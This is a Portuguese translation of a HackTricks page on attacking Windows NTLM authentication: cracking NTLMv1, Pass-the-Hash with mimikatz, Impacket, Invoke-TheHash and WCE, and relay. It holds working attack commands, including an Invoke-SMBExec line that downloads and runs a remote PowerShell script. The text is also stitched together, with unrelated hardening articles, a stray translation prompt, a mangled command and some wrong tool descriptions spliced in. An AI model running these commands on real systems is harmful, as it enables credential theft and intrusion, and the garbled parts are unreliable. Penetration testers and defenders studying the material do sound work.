# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informações Básicas

**Credenciais NTLM**: Nome do domínio (se houver), nome de usuário e hash de senha.

**LM** está habilitado apenas no **Windows XP e no servidor 2003** (os hashes LM podem ser quebrados). O hash LM AAD3B435B51404EEAAD3B435B51404EE significa que o LM não está sendo usado (é o hash LM de uma string vazia).

Por padrão, o **Kerberos** é **usado**, portanto, o NTLM só será usado se **não houver nenhum Active Directory configurado**, o **Domínio não existir**, o **Kerberos não estiver funcionando** (configuração incorreta) ou o **cliente** que tenta se conectar usando o IP em vez de um nome de host válido.

Os pacotes de rede de uma autenticação NTLM têm o cabeçalho "**NTLMSSP**".

Os protocolos: LM, NTLMv1 e NTLMv2 são suportados na DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 e NTLMv2

Você pode verificar e configurar qual protocolo será usado:

### GUI

Execute _secpol.msc_ -> Políticas locais -> Opções de segurança -> Segurança de rede: Nível de autenticação do LAN Manager. Existem 6 níveis (de 0 a 5).

![](<../../.gitbook/assets/image (92).png>)

### Registro

Isso definirá o nível 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valores possíveis:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticação de domínio NTLM

1. O **usuário** insere suas **credenciais**
2. A máquina cliente **envia uma solicitação de autenticação** enviando o **nome do domínio** e o **nome de usuário**
3. O **servidor** envia o **desafio**
4. O cliente **criptografa** o **desafio** usando o hash da senha como chave e o envia como resposta
5. O **servidor envia** para o **controlador de domínio** o **nome do domínio, o nome de usuário, o desafio e a resposta**. Se não houver um Active Directory configurado ou o nome do domínio for o nome do servidor, as credenciais são **verificadas localmente**.
6. O **controlador de domínio verifica se tudo está correto** e envia as informações para o servidor

O **servidor** e o **controlador de domínio** são capazes de criar um **Canal Seguro** via servidor **Netlogon**, pois o controlador de domínio conhece a senha do servidor (ela está dentro do banco de dados **NTDS.DIT**).

### Esquema de autenticação NTLM local

A autenticação é como a mencionada **anteriormente, mas** o **servidor** conhece o **hash do usuário** que tenta autenticar-se dentro do arquivo **SAM**. Portanto, em vez de perguntar ao controlador de domínio, o **servidor verificará por si mesmo** se o usuário pode autenticar-se.

### Desafio NTLMv1

O **tamanho do desafio é de 8 bytes** e a **resposta tem 24 bytes** de comprimento.

O **hash NT (16 bytes)** é dividido em **3 partes de 7 bytes cada** (7B + 7B + (2B+0x00\*5)): a **última parte é preenchida com zeros**. Em seguida, o **desafio** é **cifrado separadamente** com cada parte e os bytes cifrados resultantes são **unidos**. Total: 8B + 8B + 8B = 24 bytes.

**Problemas**:

* Falta de **aleatoriedade**
* As 3 partes podem ser **atacadas separadamente** para encontrar o hash NT
* **DES é quebrável**
* A 3ª chave é composta sempre por **5 zeros**.
* Dado o **mesmo desafio**, a **resposta** será a **mesma**. Portanto, você pode fornecer como **desafio** à vítima a string "**1122334455667788**" e atacar a resposta usando **tabelas arco-íris pré-computadas**.

### Ataque NTLMv1

Atualmente, está se tornando menos comum encontrar ambientes com Delegação Irrestrita configurada, mas isso não significa que você não possa **abusar de um serviço de Spooler de Impressão** configurado.

Você pode abusar de algumas credenciais/sessões que já possui no AD para **solicitar que a impressora se autentique** em algum **host sob seu controle**. Em seguida, usando `metasploit auxiliary/server/capture/smb` ou `responder`, você pode **definir o desafio de autenticação como 1122334455667788**, capturar a tentativa de autenticação e, se ela for feita usando **NTLMv1**, você poderá **quebrá-la**.\
Se você estiver usando o `responder`, pode tentar **usar a flag `--lm`** para tentar **rebaixar** a **autenticação**.\
Observe que, para essa técnica, a autenticação deve ser feita usando NTLMv1 (NTLMv2 não é válido).

Lembre-se de que a impressora usará a conta de computador durante a autenticação, e as contas de computador usam senhas **longas e aleatórias** que você **provavelmente não conseguirá quebrar** usando dicionários comuns. Mas a autenticação **NTLMv1** usa DES ([mais informações aqui](./#ntlmv1-challenge)), então, usando alguns serviços especialmente dedicados a quebrar DES, você poderá quebrá-la (você pode usar [https://crack.sh/](https://crack.sh), por exemplo).

### Ataque NTLMv1 com hashcat

O NTLMv1 também pode ser quebrado com a ferramenta NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), que formata as mensagens NTLMv1 de uma maneira que pode ser quebrada com o hashcat.

O comando
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
``` would output the below:

```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# Fortalecimento do Windows: NTLM

O NTLM (NT LAN Manager) é um protocolo de autenticação utilizado pelo Windows para autenticar usuários e permitir o acesso a recursos de rede. No entanto, o NTLM possui algumas vulnerabilidades que podem ser exploradas por hackers para obter acesso não autorizado.

Este guia aborda algumas técnicas de fortalecimento do NTLM que podem ser implementadas para aumentar a segurança do sistema Windows.

## Desabilitar o NTLMv1

O NTLMv1 é uma versão mais antiga do protocolo NTLM e é considerado inseguro devido às suas vulnerabilidades conhecidas. Recomenda-se desabilitar o NTLMv1 e permitir apenas o uso do NTLMv2, que é mais seguro.

Para desabilitar o NTLMv1, siga as etapas abaixo:

1. Abra o Editor de Política de Grupo digitando "gpedit.msc" no menu Iniciar.
2. Navegue até "Configuração do Computador" > "Configurações do Windows" > "Configurações de Segurança" > "Políticas Locais" > "Opções de Segurança".
3. Localize a política "Network security: LAN Manager authentication level" e clique duas vezes nela.
4. Selecione a opção "Enviar NTLMv2 response only" e clique em "OK".

## Configurar restrições de autenticação NTLM

Além de desabilitar o NTLMv1, é possível configurar restrições adicionais para fortalecer a autenticação NTLM. Essas restrições podem ajudar a mitigar ataques de força bruta e outros tipos de ataques.

Para configurar restrições de autenticação NTLM, siga as etapas abaixo:

1. Abra o Editor de Política de Grupo digitando "gpedit.msc" no menu Iniciar.
2. Navegue até "Configuração do Computador" > "Configurações do Windows" > "Configurações de Segurança" > "Políticas Locais" > "Opções de Segurança".
3. Localize a política "Network security: Restrict NTLM: Incoming NTLM traffic" e clique duas vezes nela.
4. Selecione a opção "Deny all accounts" e clique em "OK".
5. Localize a política "Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers" e clique duas vezes nela.
6. Selecione a opção "Deny all accounts" e clique em "OK".

Essas configurações ajudarão a restringir o uso do NTLM e fortalecer a segurança do sistema Windows contra ataques de autenticação.

## Conclusão

Implementar técnicas de fortalecimento do NTLM é essencial para proteger o sistema Windows contra ataques de autenticação. Desabilitar o NTLMv1 e configurar restrições de autenticação NTLM são medidas eficazes para aumentar a segurança do sistema e mitigar possíveis vulnerabilidades.
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Execute o hashcat (distribuído é melhor através de uma ferramenta como hashtopolis), pois caso contrário, isso levará vários dias.
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Neste caso, sabemos que a senha é password, então vamos trapacear para fins de demonstração:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Agora precisamos usar as utilidades do hashcat para converter as chaves DES quebradas em partes do hash NTLM:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
# NTLM Hardening

## Introduction

NTLM (NT LAN Manager) is an authentication protocol used in Windows operating systems. It has been widely used in the past, but it is now considered outdated and insecure. This document provides guidance on hardening NTLM to improve the security of Windows systems.

## Disable NTLMv1

NTLMv1 is the older version of the NTLM protocol and is known to have security vulnerabilities. It is recommended to disable NTLMv1 and use NTLMv2 or Kerberos instead.

To disable NTLMv1, follow these steps:

1. Open the Group Policy Editor by typing `gpedit.msc` in the Run dialog box.
2. Navigate to `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options`.
3. Locate the policy named `Network security: LAN Manager authentication level` and double-click on it.
4. Select the option `Send NTLMv2 response only. Refuse LM & NTLM` and click OK.
5. Restart the computer for the changes to take effect.

## Enable NTLMv2

NTLMv2 is an improved version of the NTLM protocol that provides stronger security. It is recommended to enable NTLMv2 and disable NTLMv1.

To enable NTLMv2, follow these steps:

1. Open the Group Policy Editor by typing `gpedit.msc` in the Run dialog box.
2. Navigate to `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options`.
3. Locate the policy named `Network security: LAN Manager authentication level` and double-click on it.
4. Select the option `Send NTLMv2 response only. Refuse LM & NTLM` and click OK.
5. Restart the computer for the changes to take effect.

## Disable NTLMv2 Session Security

NTLMv2 Session Security is an extension of NTLMv2 that provides additional security features. However, it is vulnerable to certain attacks and is not recommended for use.

To disable NTLMv2 Session Security, follow these steps:

1. Open the Group Policy Editor by typing `gpedit.msc` in the Run dialog box.
2. Navigate to `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options`.
3. Locate the policy named `Network security: NTLM SSP based (including secure RPC) client/server` and double-click on it.
4. Select the option `Disable` and click OK.
5. Restart the computer for the changes to take effect.

## Conclusion

By following the steps outlined in this document, you can harden NTLM and improve the security of your Windows systems. It is important to keep your systems up to date and follow best practices for authentication protocols to protect against potential security vulnerabilities.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
O seguinte é o conteúdo de um livro de hacking sobre técnicas de hacking. O seguinte conteúdo é do arquivo windows-hardening/ntlm/README.md. Traduza o texto em inglês relevante para o português e retorne a tradução mantendo exatamente a mesma sintaxe markdown e html. Não traduza coisas como código, nomes de técnicas de hacking, palavras de hacking, nomes de plataformas de nuvem/SaaS (como Workspace, aws, gcp...), a palavra 'leak', pentesting e tags markdown. Também não adicione nada além da tradução e da sintaxe markdown.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Desafio NTLMv2

O **tamanho do desafio é de 8 bytes** e são enviadas **2 respostas**: uma tem **24 bytes** de comprimento e o comprimento da **outra** é **variável**.

**A primeira resposta** é criada cifrando usando **HMAC\_MD5** a **string** composta pelo **cliente e o domínio** e usando como **chave** o **hash MD4** do **hash NT**. Em seguida, o **resultado** será usado como **chave** para cifrar usando **HMAC\_MD5** o **desafio**. Para isso, **um desafio do cliente de 8 bytes será adicionado**. Total: 24 B.

A **segunda resposta** é criada usando **vários valores** (um novo desafio do cliente, um **timestamp** para evitar **ataques de repetição**...)

Se você tiver um **pcap que capturou um processo de autenticação bem-sucedido**, você pode seguir este guia para obter o domínio, nome de usuário, desafio e resposta e tentar quebrar a senha: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Depois de obter o hash da vítima**, você pode usá-lo para **se passar por ela**.\
Você precisa usar uma **ferramenta** que irá **realizar** a **autenticação NTLM usando** esse **hash**, **ou** você pode criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, para que quando qualquer **autenticação NTLM seja realizada**, esse **hash será usado**. A última opção é o que o mimikatz faz.

**Por favor, lembre-se de que você também pode realizar ataques Pass-the-Hash usando contas de computador.**

### **Mimikatz**

**Precisa ser executado como administrador**.
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Isso lançará um processo que pertencerá aos usuários que iniciaram o mimikatz, mas internamente no LSASS, as credenciais salvas são aquelas dentro dos parâmetros do mimikatz. Em seguida, você pode acessar recursos de rede como se fosse esse usuário (semelhante ao truque `runas /netonly`, mas você não precisa saber a senha em texto simples).

### Pass-the-Hash a partir do Linux

Você pode obter a execução de código em máquinas Windows usando Pass-the-Hash a partir do Linux.\
[**Acesse aqui para aprender como fazer isso.**](../../windows/ntlm/broken-reference/)

### Ferramentas compiladas do Impacket para Windows

Você pode baixar [binários do Impacket para Windows aqui](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Nesse caso, você precisa especificar um comando, cmd.exe e powershell.exe não são válidos para obter um shell interativo)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Existem vários outros binários do Impacket...

### Invoke-TheHash

Você pode obter os scripts do PowerShell aqui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

O comando `Invoke-WMIExec` é uma ferramenta poderosa que permite a execução remota de comandos em sistemas Windows usando o protocolo WMI (Windows Management Instrumentation). Essa técnica é particularmente útil durante testes de penetração, pois permite que um invasor execute comandos em um sistema remoto sem a necessidade de autenticação explícita.

##### Uso

```
Invoke-WMIExec -Target <target> -Username <username> -Password <password> -Command <command>
```

##### Parâmetros

- `-Target`: O endereço IP ou nome do host do sistema de destino.
- `-Username`: O nome de usuário para autenticação no sistema de destino.
- `-Password`: A senha correspondente ao nome de usuário fornecido.
- `-Command`: O comando a ser executado no sistema de destino.

##### Exemplo

```
Invoke-WMIExec -Target 192.168.0.100 -Username Administrator -Password P@ssw0rd -Command "net user"
```

Neste exemplo, o comando `net user` será executado no sistema com o endereço IP `192.168.0.100`, usando as credenciais do usuário `Administrator` com a senha `P@ssw0rd`. O resultado do comando será exibido no console.

> **Observação**: O uso indevido dessa técnica pode ser ilegal e violar a privacidade e a segurança de sistemas e redes. Certifique-se de obter a devida autorização antes de realizar qualquer teste de penetração.
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

O comando `Invoke-SMBClient` é uma ferramenta poderosa que permite interagir com o protocolo SMB (Server Message Block) em sistemas Windows. Ele pode ser usado para realizar várias operações, como autenticação, listagem de compartilhamentos, transferência de arquivos e execução remota de comandos.

##### Sintaxe

```
Invoke-SMBClient -Target <alvo> -Username <usuário> -Password <senha> [-Command <comando>] [-Share <compartilhamento>] [-File <arquivo>] [-Verbose]
```

##### Parâmetros

- `-Target`: Especifica o endereço IP ou nome do host do alvo SMB.
- `-Username`: Especifica o nome de usuário para autenticação no alvo SMB.
- `-Password`: Especifica a senha para autenticação no alvo SMB.
- `-Command`: (Opcional) Especifica um comando a ser executado no alvo SMB.
- `-Share`: (Opcional) Especifica o nome do compartilhamento SMB a ser acessado.
- `-File`: (Opcional) Especifica o caminho do arquivo a ser transferido.
- `-Verbose`: (Opcional) Exibe informações detalhadas durante a execução.

##### Exemplos de Uso

1. Autenticar em um servidor SMB:

```
Invoke-SMBClient -Target 192.168.0.100 -Username admin -Password P@ssw0rd
```

2. Listar os compartilhamentos disponíveis em um servidor SMB:

```
Invoke-SMBClient -Target 192.168.0.100 -Username admin -Password P@ssw0rd -Command "net share"
```

3. Transferir um arquivo de um servidor SMB para o computador local:

```
Invoke-SMBClient -Target 192.168.0.100 -Username admin -Password P@ssw0rd -Share "Arquivos" -File "documento.txt"
```

4. Executar um comando remoto em um servidor SMB:

```
Invoke-SMBClient -Target 192.168.0.100 -Username admin -Password P@ssw0rd -Command "ipconfig /all"
```

##### Observações

- Certifique-se de ter permissões adequadas para acessar o servidor SMB e executar as operações desejadas.
- Use esse comando com cuidado, pois ele pode permitir acesso não autorizado a sistemas remotos.
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

O comando `Invoke-SMBEnum` é uma ferramenta poderosa que pode ser usada para enumerar informações sobre um servidor SMB (Server Message Block) em um ambiente Windows. Ele pode ser usado para identificar vulnerabilidades e configurações inseguras que podem ser exploradas por um invasor.

##### Uso

```
Invoke-SMBEnum -Target <IP> [-Port <port>] [-Credential <credential>] [-Verbose]
```

##### Parâmetros

- `Target`: O endereço IP do servidor SMB que será enumerado.
- `Port` (opcional): A porta na qual o servidor SMB está escutando. O valor padrão é 445.
- `Credential` (opcional): As credenciais de autenticação a serem usadas para se conectar ao servidor SMB. Se não forem fornecidas, serão usadas as credenciais do usuário atual.
- `Verbose` (opcional): Exibe informações detalhadas durante a execução do comando.

##### Exemplos

```
Invoke-SMBEnum -Target 192.168.0.100
```

```
Invoke-SMBEnum -Target 192.168.0.100 -Port 139 -Credential domain\username
```

##### Descrição

O `Invoke-SMBEnum` realiza uma série de etapas para enumerar informações sobre o servidor SMB alvo. Ele verifica se o servidor SMB está acessível, identifica o sistema operacional do servidor, lista os compartilhamentos disponíveis, obtém informações sobre os usuários e grupos do domínio, e verifica se há configurações de segurança inadequadas, como a autenticação NTLMv1 habilitada.

##### Resultados

O `Invoke-SMBEnum` retorna uma série de informações sobre o servidor SMB alvo, incluindo o sistema operacional, os compartilhamentos disponíveis, os usuários e grupos do domínio, e quaisquer configurações de segurança inadequadas encontradas.

##### Considerações de segurança

É importante lembrar que o `Invoke-SMBEnum` é uma ferramenta de teste de penetração e deve ser usado apenas em ambientes controlados e com permissão adequada. O uso indevido dessa ferramenta pode ser ilegal e violar a privacidade e a segurança de terceiros.
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta função é uma **combinação de todas as outras**. Você pode passar **vários hosts**, **excluir** alguns e **selecionar** a **opção** que deseja usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se você selecionar **qualquer** um dos **SMBExec** e **WMIExec**, mas **não** fornecer nenhum parâmetro _**Command**_, ele apenas irá **verificar** se você tem **permissões suficientes**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Precisa ser executado como administrador**

Esta ferramenta fará a mesma coisa que o mimikatz (modificar a memória do LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Execução remota manual do Windows com nome de usuário e senha

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extração de credenciais de um Host Windows

**Para obter mais informações sobre** [**como obter credenciais de um host Windows, você deve ler esta página**](broken-reference)**.**

## NTLM Relay e Responder

**Leia um guia mais detalhado sobre como realizar esses ataques aqui:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analisando desafios NTLM de uma captura de rede

**Você pode usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
